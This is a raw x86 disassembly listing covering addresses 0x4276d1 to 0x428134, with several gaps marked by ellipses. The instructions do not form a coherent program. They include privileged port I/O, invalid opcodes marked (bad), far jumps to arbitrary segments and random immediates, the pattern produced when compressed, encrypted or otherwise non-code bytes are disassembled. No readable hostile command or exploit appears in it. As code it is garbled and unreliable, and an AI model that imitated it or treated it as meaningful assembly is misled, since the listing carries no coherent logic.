  4276d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276d2:	xor    sp,WORD PTR [esi]
  4276d5:	iret   
  4276d6:	outs   dx,DWORD PTR ds:[esi]
  4276d7:	icebp  
  4276d8:	mov    esp,0xce4b5a97
  4276dd:	fs iret 
  4276df:	scas   eax,DWORD PTR es:[edi]
  4276e0:	cli    
  4276e1:	and    ch,BYTE PTR [esi+0x4c]
  4276e4:	sbb    BYTE PTR [ecx-0x7c80dd69],0x39
  4276eb:	jo     0x427718
	...
  427755:	add    BYTE PTR [ecx],al
  427757:	push   esi
  427758:	nop
  427759:	out    dx,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	out    dx,al
  42775c:	jg     0x42775d
  42775e:	in     al,dx
  42775f:	xor    al,0x86
  427761:	fxch   st(5)
  427763:	int3   
  427764:	mov    al,0x42
  427766:	xchg   edi,eax
  427767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427768:	add    DWORD PTR [eax],eax
  42776a:	inc    DWORD PTR [eax]
  42776c:	add    BYTE PTR [eax],al
  42776e:	xor    BYTE PTR gs:[ebp+ecx*1-0x1863ff3a],ch
  427776:	repz xlat BYTE PTR ds:[ebx]
  427778:	lea    edx,[edi+0x76]
  42777b:	add    BYTE PTR [eax],al
  42777d:	aam    0x2d
  42777f:	fsub   st,st(2)
  427781:	nop
  427782:	add    ch,BYTE PTR [edx+0x6]
  427785:	pop    ss
  427786:	fadd   st(1),st
  427788:	test   al,0xc9
  42778a:	outs   dx,DWORD PTR ds:[esi]
  42778b:	push   edx
  42778c:	push   edx
  42778d:	xchg   DWORD PTR [edx],esp
  42778f:	cmp    eax,0xd1028853
  427794:	or     eax,0xf1469ea9
  427799:	pop    ss
  42779a:	xor    BYTE PTR [ebx-0x62],dl
  42779d:	mov    ebx,0x95399a12
  4277a2:	dec    eax
  4277a3:	addr16 clc 
  4277a5:	(bad)  
  4277a6:	inc    ebp
  4277a7:	sti    
  4277a8:	arpl   WORD PTR ds:0x57327abc,sp
  4277ae:	les    esi,FWORD PTR [eax+edi*2]
  4277b1:	xchg   edx,eax
  4277b2:	xchg   esi,eax
  4277b3:	or     esi,DWORD PTR [edx+0x78]
  4277b6:	int3   
  4277b7:	imul   ebx,DWORD PTR [edi+0x56b74666],0x4d19ed6f
  4277c1:	sbb    DWORD PTR [ebx+0x57],ecx
  4277c4:	shl    DWORD PTR [esi],cl
  4277c6:	sbb    DWORD PTR [ecx-0x1c30f005],esi
  4277cc:	popa   
  4277cd:	jg     0x427811
  4277cf:	ror    edx,1
  4277d1:	push   0xffffff88
  4277d3:	adc    al,0x1d
  4277d5:	jbe    0x42780e
  4277d7:	call   0xe519:0xe40b995e
  4277de:	push   0xffffffde
  4277e0:	lods   al,BYTE PTR ds:[esi]
  4277e1:	mov    BYTE PTR [esi-0x41],ch
  4277e4:	mov    ch,0x62
  4277e6:	cmp    BYTE PTR ds:0x846203eb,bh
  4277ec:	sbb    BYTE PTR [ebp+ecx*2+0x61d29489],0x84
  4277f4:	int3   
  4277f5:	adc    DWORD PTR [ebp+0x18742d32],ecx
  4277fb:	mov    BYTE PTR [edx-0x4d],al
  4277fe:	push   ecx
  4277ff:	pop    ss
  427800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427801:	jno    0x427801
  427803:	xchg   ecx,eax
  427804:	dec    ebp
  427805:	fidivr DWORD PTR [edi+eax*1-0x51]
  427809:	dec    edi
  42780a:	mov    cs,WORD PTR [ebp+0x40c0c4cb]
  427810:	retf   
  427811:	push   cs
  427812:	pop    eax
  427813:	push   0xf16c4b62
  427818:	mov    ecx,0xab8386a9
  42781d:	xchg   bh,dl
  42781f:	dec    ecx
  427820:	dec    ecx
  427821:	add    eax,0x7cee8a38
  427826:	mov    ss,edi
  427828:	sub    BYTE PTR ds:[esi],0x8b
  42782c:	adc    BYTE PTR [eax],dl
  42782e:	jmp    0x4277f5
  427830:	fwait
  427831:	inc    esp
  427832:	mov    bl,0x53
  427834:	jl     0x427843
  427836:	push   eax
  427837:	or     cl,dh
  427839:	(bad)  
  42783a:	(bad)  [eax+0xd3dfc01]
  427840:	push   cs
  427841:	fild   QWORD PTR [ebx-0x3248f092]
  427847:	mov    dh,0x33
  427849:	(bad)  
  42784a:	lea    ebp,[ecx+0x10]
  42784d:	ret    
  42784e:	stos   BYTE PTR es:[edi],al
  42784f:	sub    esp,DWORD PTR [ebp+eax*4-0x27]
  427853:	mov    al,0x54
  427855:	mov    ah,al
  427857:	dec    esp
  427858:	daa    
  427859:	ins    BYTE PTR es:[edi],dx
  42785a:	jl     0x427868
  42785c:	sbb    eax,0xc5685245
  427861:	rol    BYTE PTR [edi],cl
  427863:	and    eax,0xe4d6a42a
  427868:	xchg   ecx,eax
  427869:	mov    BYTE PTR [ecx],ah
  42786b:	lds    edi,FWORD PTR [edi+0x0]
	...
  4278d6:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  4278dc:	pop    esi
  4278dd:	fbstp  TBYTE PTR [eax+0x65]
  4278e0:	fldl2e 
  4278e2:	xchg   esp,eax
  4278e3:	mov    ah,0x5c
  4278e5:	sahf   
  4278e6:	xchg   esi,eax
  4278e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278e8:	add    DWORD PTR [eax],eax
  4278ea:	inc    DWORD PTR [eax]
  4278ec:	add    BYTE PTR [eax],al
  4278ee:	and    eax,0xe2f100a2
  4278f3:	cmp    eax,0x4c8787b6
  4278f8:	or     BYTE PTR [ecx+0x1f],ah
  4278fb:	lea    esp,[ecx]
  4278fd:	fisub  DWORD PTR [edx-0x7f9d2b15]
  427903:	push   ss
  427904:	sbb    al,0x57
  427906:	or     bh,BYTE PTR [ecx+0x6e]
  427909:	jne    0x42789e
  42790b:	cmp    DWORD PTR [ebp+esi*8-0x2388b690],esi
  427912:	into   
  427913:	sbb    eax,0x33245dd5
  427918:	mov    WORD PTR [edx-0x47],ss
  42791b:	lds    eax,FWORD PTR cs:[ebp+eiz*2+0x7870eb47]
  427923:	addr16 push edx
  427925:	pop    edx
  427926:	and    DWORD PTR ds:0x797dbe4c,0x6e
  42792d:	inc    edi
  42792e:	mov    dl,0xc7
  427930:	dec    esp
  427931:	mov    ebx,0x61162025
  427936:	ins    DWORD PTR es:[edi],dx
  427937:	aaa    
  427938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427939:	ins    BYTE PTR es:[edi],dx
  42793a:	xchg   esi,eax
  42793b:	je     0x427902
  42793d:	cmp    BYTE PTR [esi+0x791bf2c4],bh
  427943:	mov    esi,0x3e75cd78
  427948:	mov    esi,0xe4b4f4ea
  42794d:	loope  0x427912
  42794f:	cwde   
  427950:	xchg   edi,eax
  427951:	arpl   WORD PTR ds:0xfef77d9f,dx
  427957:	inc    edi
  427958:	pop    eax
  427959:	outs   dx,DWORD PTR ds:[esi]
  42795a:	sbb    esp,DWORD PTR [ebp-0x1c770504]
  427960:	push   cs
  427961:	call   0x2389ec67
  427966:	jnp    0x427911
  427968:	pop    edi
  427969:	jb     0x427951
  42796b:	xchg   BYTE PTR [ecx+0x4d],dh
  42796e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42796f:	nop
  427970:	push   es
  427971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427972:	out    dx,eax
  427973:	pop    ss
  427974:	push   edx
  427975:	pop    edx
  427976:	call   0x882a:0x44d30e5a
  42797d:	pop    es
  42797e:	jmp    FWORD PTR [edx-0x458abdc4]
  427984:	mov    BYTE PTR [edx+0x59],dh
  427987:	cdq    
  427988:	add    eax,ecx
  42798a:	add    eax,0x9c45ed65
  42798f:	xor    DWORD PTR [ebp+esi*2+0xdda4917],ebp
  427996:	daa    
  427997:	dec    ebp
  427998:	hlt    
  427999:	mov    esp,0xac1d87b7
  42799e:	sub    DWORD PTR [eax-0x789daf57],0x320ac6fa
  4279a8:	fadd   DWORD PTR [esi+ecx*8+0xf]
  4279ac:	(bad)  
  4279ad:	push   esp
  4279ae:	pop    es
  4279af:	pop    eax
  4279b0:	int3   
  4279b1:	xor    BYTE PTR [ecx-0x7708516d],bl
  4279b7:	mov    al,ds:0xd94453ac
  4279bc:	adc    BYTE PTR [edx-0xc6c1744],bh
  4279c2:	pop    ss
  4279c3:	cmp    al,0x46
  4279c5:	aas    
  4279c6:	add    eax,0xa9f186ce
  4279cb:	xchg   ecx,eax
  4279cc:	jbe    0x42796b
  4279ce:	pop    ebp
  4279cf:	retf   0x6341
  4279d2:	in     al,0x90
  4279d4:	test   BYTE PTR [ecx-0x6],dh
  4279d7:	cmovs  edi,DWORD PTR [edx+0x13]
  4279db:	and    bh,BYTE PTR [ebx+0x7a]
  4279de:	vpaddsb xmm0,xmm7,XMMWORD PTR [ebx-0x4f]
  4279e3:	iret   
  4279e4:	push   edx
  4279e5:	cmp    ecx,eax
  4279e7:	jecxz  0x4279c7
  4279e9:	adc    al,0xf7
  4279eb:	adc    ch,al
	...
  427a55:	add    BYTE PTR [edx-0x5c0023],bl
  427a5b:	mov    ds:0x7542fdde,eax
  427a60:	fadd   DWORD PTR [ebx+0x25325051]
  427a66:	xchg   ebp,eax
  427a67:	test   al,0x1
  427a69:	add    bh,bh
  427a6b:	add    BYTE PTR [eax],al
  427a6d:	add    BYTE PTR [eax+0x29],ah
  427a70:	xor    al,0x79
  427a72:	inc    ebx
  427a73:	clc    
  427a74:	repnz dec esp
  427a76:	dec    eax
  427a77:	stc    
  427a78:	adc    DWORD PTR [eax+ebx*1-0x55fe3f5b],0x4c51b7bf
  427a83:	repnz dec edi
  427a85:	inc    esi
  427a86:	in     al,dx
  427a87:	(bad)  
  427a88:	xchg   esp,eax
  427a89:	int    0x1c
  427a8b:	xchg   edi,eax
  427a8c:	pop    ebx
  427a8d:	pop    ebp
  427a8e:	add    eax,0x59497bf1
  427a93:	test   DWORD PTR [esi+edi*2],ecx
  427a96:	dec    ecx
  427a97:	xchg   BYTE PTR [esp+ebp*2-0x9],bl
  427a9b:	or     eax,0xa20093e0
  427aa0:	sub    eax,0x972fefcb
  427aa5:	ss inc eax
  427aa7:	test   al,0x9c
  427aa9:	mov    es:0x2ebb295b,eax
  427aaf:	mov    eax,0xbee078bd
  427ab4:	mov    edi,0x9ff04a3e
  427ab9:	(bad)  
  427aba:	call   FWORD PTR [edx+0x17]
  427abd:	mov    ch,0x40
  427abf:	pop    ss
  427ac0:	pusha  
  427ac1:	push   edi
  427ac2:	push   es
  427ac3:	cmp    esi,DWORD PTR [esi-0x6dd0cc34]
  427ac9:	or     DWORD PTR [edi-0x5ae4a0b0],ebx
  427acf:	xchg   edi,eax
  427ad0:	ficomp WORD PTR [ebx+eax*1-0x56]
  427ad4:	fwait
  427ad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ad6:	retf   
  427ad7:	jle    0x427acc
  427ad9:	add    ebp,ecx
  427adb:	jl     0x427a95
  427add:	dec    esp
  427ade:	arpl   WORD PTR [ebx+0x6e],ax
  427ae1:	loopne 0x427b53
  427ae3:	dec    esi
  427ae4:	dec    ebp
  427ae5:	or     DWORD PTR [edi],ecx
  427ae7:	leave  
  427ae8:	dec    eax
  427ae9:	in     eax,dx
  427aea:	and    DWORD PTR [ecx],esp
  427aec:	(bad)  
  427aee:	pop    esi
  427aef:	in     eax,dx
  427af0:	cs call 0x82e28b66
  427af6:	add    ebx,ebp
  427af8:	add    edi,DWORD PTR [ebp-0x70089338]
  427afe:	push   0x9
  427b00:	je     0x427b0c
  427b02:	or     eax,0x1240712f
  427b07:	add    BYTE PTR [ecx+ecx*1+0x6a6b0caa],0xbc
  427b0f:	mov    DWORD PTR [edx],eax
  427b11:	repnz fdivr DWORD PTR [eax+0x4efb73ee]
  427b18:	xor    bh,BYTE PTR [ebp-0x48a7ebc6]
  427b1e:	mov    esi,0xc6c188e1
  427b23:	std    
  427b24:	jl     0x427b2d
  427b26:	int3   
  427b27:	sbb    esi,DWORD PTR [edx-0x4b]
  427b2a:	mov    eax,0x455ea5d4
  427b2f:	adc    BYTE PTR [ebp-0x119e0e03],ah
  427b35:	xchg   ebp,eax
  427b36:	dec    ebx
  427b37:	aam    0x62
  427b39:	xor    eax,0x7ece4e38
  427b3e:	jmp    0x351:0x3377e46c
  427b45:	shr    ah,cl
  427b47:	fs ss out 0x55,eax
  427b4b:	jae    0x427bbc
  427b4d:	addr16 add ecx,edi
  427b50:	fcomi  st,st(0)
  427b52:	add    al,0x1d
  427b54:	ret    
  427b55:	test   eax,0xf4e77ad5
  427b5a:	push   es
  427b5b:	out    0xb8,eax
  427b5d:	dec    DWORD PTR [edx]
  427b5f:	rcr    BYTE PTR ds:0xc07c9c03,0x6
  427b66:	cmp    BYTE PTR [edi-0x67773037],ah
  427b6c:	add    BYTE PTR es:[eax],al
	...
  427bd3:	add    BYTE PTR [eax],al
  427bd5:	add    dl,cl
  427bd7:	mov    edx,DWORD PTR [edx+0x7b]
  427bda:	push   ebx
  427bdb:	sti    
  427bdc:	jmp    0x427b99
  427bde:	push   ecx
  427bdf:	mov    ecx,ebx
  427be1:	test   BYTE PTR [edx-0x6bfc53d5],0xa9
  427be8:	add    DWORD PTR [eax],eax
  427bea:	inc    DWORD PTR [eax]
  427bec:	add    BYTE PTR [eax],al
  427bee:	push   0x94a42c47
  427bf3:	out    dx,eax
  427bf4:	fcom   DWORD PTR [eax-0x16]
  427bf7:	jae    0x427bc5
  427bf9:	(bad)  
  427bfa:	jno    0x427c58
  427bfc:	jl     0x427c73
  427bfe:	add    esp,DWORD PTR [ebp+0xe]
  427c01:	jge    0x427c7e
  427c03:	xor    BYTE PTR [edi],ah
  427c05:	nop
  427c06:	xor    al,0xa3
  427c08:	fs xchg edi,eax
  427c0a:	xchg   esi,eax
  427c0b:	ins    BYTE PTR es:[edi],dx
  427c0c:	ins    BYTE PTR es:[edi],dx
  427c0d:	(bad)  
  427c0e:	fst    DWORD PTR [edx-0x5e]
  427c11:	sub    edi,esi
  427c13:	inc    eax
  427c14:	cmp    BYTE PTR [esi+0x64],0xbc
  427c18:	ins    DWORD PTR es:[edi],dx
  427c19:	or     eax,0xf4d063f
  427c1e:	call   FWORD PTR [esi+0x418d4c9f]
  427c24:	out    0xe9,al
  427c26:	xor    eax,0xd52bc061
  427c2b:	lea    esi,[edi+0x71b60c1b]
  427c31:	rol    DWORD PTR ds:0x60e07916,0x28
  427c38:	push   ss
  427c39:	xor    eax,0x50f14d2b
  427c3e:	call   0x56c2a1b1
  427c43:	ins    BYTE PTR es:[edi],dx
  427c44:	test   BYTE PTR [edi],0x56
  427c47:	rcr    DWORD PTR [ebx],cl
  427c49:	jne    0x427c38
  427c4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c4c:	stos   BYTE PTR es:[edi],al
  427c4d:	add    eax,0xba443bd7
  427c52:	das    
  427c53:	xchg   ebp,eax
  427c54:	xor    edx,DWORD PTR [edx-0x2f2ee1af]
  427c5a:	add    DWORD PTR [ecx],edi
  427c5c:	neg    DWORD PTR [esi-0x245eda34]
  427c62:	push   es
  427c63:	les    ebp,FWORD PTR [edi-0x5a6af187]
  427c69:	add    ebp,eax
  427c6b:	stos   DWORD PTR es:[edi],eax
  427c6c:	retf   0x5342
  427c6f:	mov    ch,0x2a
  427c71:	jnp    0x427bfa
  427c73:	jmp    0x427c25
  427c75:	mov    edx,DWORD PTR [ebp-0x5cdfe280]
  427c7b:	stc    
  427c7c:	jl     0x427c63
  427c7e:	mov    bl,0x11
  427c80:	push   eax
  427c81:	dec    esi
  427c82:	jmp    0x4342:0xbf69c420
  427c89:	xchg   esi,eax
  427c8a:	mov    WORD PTR [edi],?
  427c8c:	shl    esi,cl
  427c8e:	scas   al,BYTE PTR es:[edi]
  427c8f:	hlt    
  427c90:	in     eax,dx
  427c91:	aaa    
  427c92:	xor    eax,ebp
  427c94:	pop    ebx
  427c95:	ins    DWORD PTR es:[edi],dx
  427c96:	and    al,0xbd
  427c98:	popf   
  427c99:	add    eax,0x6064952f
  427c9e:	jle    0x427c29
  427ca0:	adc    cl,BYTE PTR [esi-0x71a53f0a]
  427ca6:	scas   eax,DWORD PTR es:[edi]
  427ca7:	pop    ss
  427ca8:	jo     0x427ccb
  427caa:	ret    0x7dbd
  427cad:	in     eax,dx
  427cae:	mov    edx,0x31408968
  427cb3:	out    0x2f,al
  427cb5:	sub    eax,0xa1911deb
  427cba:	fwait
  427cbb:	out    0x25,al
  427cbd:	cmp    cl,dl
  427cbf:	lock mov eax,0x208c296f
  427cc5:	xchg   BYTE PTR [edi+0x42],bh
  427cc8:	subpd  xmm2,xmm5
  427ccc:	aad    0xe0
  427cce:	pop    ds
  427ccf:	dec    ebx
  427cd0:	jle    0x427d2c
  427cd2:	lods   eax,DWORD PTR ds:[esi]
  427cd3:	xor    eax,0xf41033b4
  427cd8:	fadd   QWORD PTR ds:0x5a7759f9
  427cde:	cld    
  427cdf:	bound  edx,QWORD PTR [ebp+0x47]
  427ce2:	aaa    
  427ce3:	imul   edi,DWORD PTR [ecx+0x2b],0x970d1a30
  427cea:	mov    esi,ebp
  427cec:	mov    esi,0x0
	...
  427d55:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427d5b:	jecxz  0x427d50
  427d5d:	lock xchg DWORD PTR ds:0x144c5d44,ebx
  427d64:	dec    esi
  427d65:	xor    BYTE PTR [ebx-0xfffe56],dl
  427d6b:	add    BYTE PTR [eax],al
  427d6d:	add    BYTE PTR [edx+ecx*8-0x1],dl
  427d71:	lds    ebx,FWORD PTR [ebp-0x650af32a]
  427d77:	xchg   ebp,eax
  427d78:	lods   al,BYTE PTR ds:[esi]
  427d79:	pop    eax
  427d7a:	stc    
  427d7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d7c:	iret   
  427d7d:	pop    edx
  427d7e:	inc    esi
  427d7f:	push   es
  427d80:	enter  0xec3b,0x74
  427d84:	pop    edi
  427d85:	inc    esp
  427d86:	pop    eax
  427d87:	rep movs WORD PTR es:[edi],WORD PTR gs:[esi]
  427d8b:	xchg   BYTE PTR [eax],ah
  427d8d:	sbb    ebx,esp
  427d8f:	inc    ecx
  427d90:	lods   eax,DWORD PTR ds:[esi]
  427d91:	sbb    DWORD PTR [ecx-0x1b],ecx
  427d94:	mov    ds:0x1069a0f7,eax
  427d99:	rol    BYTE PTR [eax],cl
  427d9b:	xchg   edx,eax
  427d9c:	enter  0x210,0x72
  427da0:	jns    0x427e12
  427da2:	das    
  427da3:	jg     0x427d27
  427da5:	out    dx,eax
  427da6:	mov    al,ds:0xd8ec2fc8
  427dab:	out    0x9f,al
  427dad:	and    eax,0x8542a40f
  427db2:	xor    BYTE PTR [edx],al
  427db4:	or     ebp,ebx
  427db6:	les    ecx,FWORD PTR [ecx-0x3b761190]
  427dbc:	mov    ebp,0xe9a16c01
  427dc1:	add    esp,DWORD PTR [ebp+0x7dc95600]
  427dc7:	popa   
  427dc8:	or     BYTE PTR [ecx+0x33],0x55
  427dcc:	jmp    FWORD PTR [edx-0x38]
  427dcf:	std    
  427dd0:	pop    esi
  427dd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427dd2:	les    esi,FWORD PTR [esi-0x33]
  427dd5:	pop    esp
  427dd6:	xor    BYTE PTR [ecx-0x59679fe9],cl
  427ddc:	psubq  mm0,QWORD PTR [edi+0x17]
  427de0:	dec    esi
  427de1:	add    al,0xc0
  427de3:	xchg   BYTE PTR [edx-0x3f4ffd69],ch
  427de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427dea:	sub    eax,esp
  427dec:	pop    eax
  427ded:	lahf   
  427dee:	push   ebp
  427def:	mov    bl,0x25
  427df1:	jns    0x427dbb
  427df3:	xor    eax,0x3fb4eae2
  427df8:	sar    BYTE PTR [edx+edx*8+0x46b32806],1
  427dff:	jmp    0x427df6
  427e01:	mul    ah
  427e03:	lahf   
  427e04:	pop    DWORD PTR ds:0x726f23d
  427e0a:	shl    BYTE PTR [esi+0x67],0x6
  427e0e:	sub    eax,0x92aac448
  427e13:	adc    dh,BYTE PTR [eax]
  427e15:	sbb    BYTE PTR [edx],bh
  427e17:	jp     0x427e46
  427e19:	cdq    
  427e1a:	cwde   
  427e1b:	inc    edi
  427e1c:	jecxz  0x427e5d
  427e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e1f:	call   0x3856:0x51ad52ce
  427e26:	xor    BYTE PTR [edx],al
  427e28:	ror    cl,1
  427e2a:	mov    edi,DWORD PTR [esi-0x14]
  427e2d:	xchg   BYTE PTR [ebp+ecx*2-0x44406157],ah
  427e34:	pushf  
  427e35:	push   cs
  427e36:	inc    eax
  427e37:	je     0x427dfa
  427e39:	pop    esi
  427e3a:	out    dx,eax
  427e3b:	dec    edi
  427e3c:	xchg   ebx,eax
  427e3d:	not    dh
  427e3f:	jl     0x427df7
  427e41:	in     al,0x4d
  427e43:	idiv   DWORD PTR [ebx]
  427e45:	and    eax,0x14a9902c
  427e4a:	jne    0x427ec5
  427e4c:	mov    fs,WORD PTR [edx+0x6ab734b2]
  427e52:	daa    
  427e53:	ds mov ecx,0x4485c2d1
  427e59:	inc    ecx
  427e5a:	push   cs
  427e5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427e5c:	stos   BYTE PTR es:[edi],al
  427e5d:	(bad)  
  427e5e:	cmc    
  427e5f:	sti    
  427e60:	inc    ebp
  427e61:	loop   0x427e74
  427e63:	sbb    al,0xe2
  427e65:	or     bh,0x5f
  427e68:	out    dx,al
  427e69:	cmc    
  427e6a:	sahf   
  427e6b:	dec    ebx
  427e6c:	sbb    DWORD PTR [eax],eax
	...
  427ed6:	mov    eax,0x6d3c25f1
  427edb:	cld    
  427edc:	mov    ecx,0x2bc293f5
  427ee1:	leave  
  427ee2:	div    edi
  427ee4:	cmp    al,0x64
  427ee6:	xchg   edx,eax
  427ee7:	stos   DWORD PTR es:[edi],eax
  427ee8:	add    DWORD PTR [eax],eax
  427eea:	inc    DWORD PTR [eax]
  427eec:	add    BYTE PTR [eax],al
  427eee:	stos   DWORD PTR es:[edi],eax
  427eef:	pop    es
  427ef0:	cdq    
  427ef1:	and    ebp,DWORD PTR [ebp+0x2c]
  427ef4:	push   edx
  427ef5:	lods   al,BYTE PTR ds:[esi]
  427ef6:	xchg   ebp,eax
  427ef7:	pop    esi
  427ef8:	aad    0x51
  427efa:	ss sbb eax,0x250c8c88
  427f00:	xchg   ebp,eax
  427f01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f02:	sbb    eax,0xe2cc8ca7
  427f07:	ins    BYTE PTR es:[edi],dx
  427f08:	popa   
  427f09:	leave  
  427f0a:	les    esi,FWORD PTR [esi+eax*1-0x60]
  427f0e:	inc    ebx
  427f0f:	stc    
  427f10:	scas   al,BYTE PTR es:[edi]
  427f11:	push   0x48870ae2
  427f16:	sar    BYTE PTR [esi],0xad
  427f19:	(bad)  
  427f1a:	int    0xdf
  427f1c:	dec    edx
  427f1d:	dec    eax
  427f1e:	push   edx
  427f1f:	pop    ecx
  427f20:	add    DWORD PTR [ebx],ecx
  427f22:	xlat   BYTE PTR ds:[ebx]
  427f23:	fwait
  427f24:	mov    dh,ch
  427f26:	ucomiss xmm0,DWORD PTR [edx]
  427f29:	mov    WORD PTR [edi],ds
  427f2b:	pop    esi
  427f2c:	sub    BYTE PTR [edi],dh
  427f2e:	push   edx
  427f2f:	arpl   bx,bp
  427f31:	in     eax,0xed
  427f33:	or     al,0xd6
  427f35:	in     al,dx
  427f36:	hlt    
  427f37:	js     0x427f8c
  427f39:	add    ebp,ebx
  427f3b:	retf   
  427f3c:	xchg   ecx,eax
  427f3d:	xchg   esi,eax
  427f3e:	cmp    DWORD PTR ds:[ebp-0x78e6ce1e],0xf63d4385
  427f49:	stos   DWORD PTR es:[edi],eax
  427f4a:	ds dec eax
  427f4c:	adc    ebx,DWORD PTR [ebx-0x429532ec]
  427f52:	call   0xa5f5d68d
  427f57:	mov    bl,0xa3
  427f59:	das    
  427f5a:	out    dx,al
  427f5b:	les    esi,FWORD PTR [esi-0x72]
  427f5e:	jmp    0x89d3b9c4
  427f63:	stos   DWORD PTR es:[edi],eax
  427f64:	pushf  
  427f65:	aad    0x2b
  427f67:	pop    eax
  427f68:	mov    edi,0xa0b1b789
  427f6d:	(bad)
  427f71:	sar    BYTE PTR [eax+0x76],1
  427f74:	out    0xb4,eax
  427f76:	cld    
  427f77:	add    DWORD PTR [edx+ebx*1],edi
  427f7a:	jecxz  0x427f81
  427f7c:	push   ebx
  427f7d:	in     eax,dx
  427f7e:	mov    ebp,0xf4324e2b
  427f83:	pop    edi
  427f84:	jge    0x427f41
  427f86:	push   esi
  427f87:	inc    esi
  427f88:	dec    ebx
  427f89:	xchg   ebp,eax
  427f8a:	or     BYTE PTR [eax],0x3
  427f8d:	stc    
  427f8e:	xchg   edi,eax
  427f8f:	xchg   ecx,eax
  427f90:	loop   0x427fe5
  427f92:	adc    BYTE PTR [ebx],ah
  427f94:	mov    edi,ebp
  427f96:	xchg   ecx,eax
  427f97:	scas   al,BYTE PTR es:[edi]
  427f98:	push   0x4649d5e0
  427f9d:	xchg   esp,eax
  427f9e:	mov    esp,0x5596ed66
  427fa3:	xor    DWORD PTR [esi+esi*8-0xc2af9c8],0xff0a4136
  427fae:	data16 mov ds:0x7425a0f9,al
  427fb4:	(bad)  
  427fb5:	push   esi
  427fb6:	pop    ss
  427fb7:	lods   al,BYTE PTR ds:[esi]
  427fb8:	mov    BYTE PTR [edx-0x4b],bh
  427fbb:	mov    al,0x84
  427fbd:	mov    DWORD PTR [edi-0x8],ebp
  427fc0:	xchg   edx,eax
  427fc1:	rcr    ebp,1
  427fc3:	into   
  427fc4:	sbb    BYTE PTR [edi+0x59],0x8f
  427fc8:	xlat   BYTE PTR ds:[ebx]
  427fc9:	mov    ebp,0xe726cdb
  427fce:	mov    ch,0x4d
  427fd0:	add    al,0x14
  427fd2:	in     eax,dx
  427fd3:	adc    DWORD PTR [ecx+0x28],0x867d355b
  427fda:	mov    ds:0x226e884a,al
  427fdf:	icebp  
  427fe0:	cmp    DWORD PTR [eax+eax*4+0x19252239],esp
  427fe7:	shl    DWORD PTR ss:[edi-0x5b],1
  427feb:	cdq    
  427fec:	les    eax,FWORD PTR [eax]
	...
  428056:	mov    cl,0xa7
  428058:	dec    ebx
  428059:	das    
  42805a:	pop    edi
  42805b:	out    dx,eax
  42805c:	cmc    
  42805d:	mov    edi,0x22b0803f
  428062:	or     esp,edx
  428064:	pop    ebx
  428065:	sbb    eax,0x1ac91
  42806a:	inc    DWORD PTR [eax]
  42806c:	add    BYTE PTR [eax],al
  42806e:	or     BYTE PTR [esi],0x3d
  428071:	aad    0x2d
  428073:	mov    dh,0x9a
  428075:	pop    ecx
  428076:	lock ret 0x4625
  42807a:	push   0x56
  42807c:	or     al,0x36
  42807e:	jo     0x42806b
  428080:	(bad)  
  428081:	(bad)  [edx*2-0x15ef13d0]
  428088:	stos   DWORD PTR es:[edi],eax
  428089:	call   0x862754df
  42808e:	add    edi,DWORD PTR [eax+ebx*8]
  428091:	xlat   BYTE PTR ds:[ebx]
  428092:	sub    BYTE PTR [ebx],ch
  428094:	dec    edi
  428095:	inc    eax
  428096:	pushf  
  428097:	jle    0x4280e9
  428099:	jne    0x42804a
  42809b:	mov    bh,0xad
  42809d:	sub    eax,0xa03768c
  4280a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280a3:	mov    es,WORD PTR [eax]
  4280a5:	mov    eax,0x44b5c9a
  4280aa:	ins    BYTE PTR es:[edi],dx
  4280ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280ac:	jmp    0xfdda:0x86ff114
  4280b3:	xchg   ecx,eax
  4280b4:	lds    esp,FWORD PTR cs:[ecx-0x5f]
  4280b8:	ror    eax,1
  4280ba:	in     eax,dx
  4280bb:	(bad)  
  4280bc:	idiv   esp
  4280be:	loop   0x4280b4
  4280c0:	cwde   
  4280c1:	xor    BYTE PTR [edi-0x59],ah
  4280c4:	sub    DWORD PTR [edx-0x4344219a],0xffffff92
  4280cb:	in     eax,0x4
  4280cd:	xor    al,0x8b
  4280cf:	into   
  4280d0:	rcr    DWORD PTR [esi+0x58695392],0x78
  4280d7:	retf   0x98d4
  4280da:	cmp    ebp,DWORD PTR [edi+eiz*4-0x6c95490]
  4280e1:	cs sbb eax,0x157572a0
  4280e7:	lds    ebx,FWORD PTR [esi+eiz*8+0x5cbf26e1]
  4280ee:	cdq    
  4280ef:	jmp    0xc907cb53
  4280f4:	sub    esi,edx
  4280f6:	mov    WORD PTR [eax],ss
  4280f8:	rol    DWORD PTR [eax],cl
  4280fa:	aas    
  4280fb:	cdq    
  4280fc:	push   eax
  4280fd:	xor    DWORD PTR [ebp-0x4b],edi
  428100:	or     dh,BYTE PTR [eax+0x5b4b2bed]
  428106:	hlt    
  428107:	bound  edi,QWORD PTR [ecx+esi*4]
  42810a:	mov    DWORD PTR [esi-0xedd710d],ebp
  428110:	push   0xffffffb1
  428112:	out    0x17,eax
  428114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428115:	sbb    edx,DWORD PTR [edx-0x1d]
  428118:	dec    edx
  428119:	aas    
  42811a:	jg     0x4280ac
  42811c:	sahf   
  42811d:	push   cs
  42811e:	popf   
  42811f:	fimul  WORD PTR [edx+ebx*2+0x40afbdb6]
  428126:	push   0x8504be6c
  42812b:	icebp  
  42812c:	and    eax,0x70b1cc52
  428131:	rcr    ebp,0xa6
  428134:	test   eax,0xf2f46ca3
